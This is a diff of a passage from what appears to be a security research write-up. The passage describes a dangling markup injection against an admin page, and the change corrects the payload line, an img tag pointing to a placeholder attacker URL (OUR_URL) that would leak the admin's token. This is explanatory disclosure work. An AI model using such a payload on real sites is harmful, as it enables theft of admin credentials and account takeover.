@@ -296,7 +296,7 @@ By Googling for my name in combination with ATS request smuggling, some people w
 
 Instead of using Scroll-To-Text-Fragment, a much simpler attack would be to use a dangling markup injection that exfiltrated the admin's token to our URL through an image tag.
 
-`"><img src="https://OUR_URL. If"><img src="https://OUR_URL?a=`
+`"><img src="https://OUR_URL?a=`
 
 This would translate to&#x20;
 
